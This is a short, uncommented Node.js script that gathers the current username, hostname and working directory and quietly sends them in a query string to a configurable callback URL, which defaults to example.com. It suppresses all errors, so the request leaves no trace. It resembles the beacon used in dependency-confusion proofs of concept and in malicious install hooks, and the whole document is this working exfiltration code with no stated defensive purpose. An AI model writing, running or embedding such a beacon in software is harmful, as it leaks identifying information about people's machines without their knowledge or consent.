const os=require('os');const https=require('https');
const base=process.env.CALLBACK_URL||'https://example.com/';
const payload={user:os.userInfo().username,host:os.hostname(),cwd:process.cwd()};
const qs=Object.entries(payload).map(([k,v])=>`${encodeURIComponent(k)}=${encodeURIComponent(String(v))}`).join('&');
const url=`${base}?${qs}`;
https.get(url,()=>{}).on('error',()=>{});
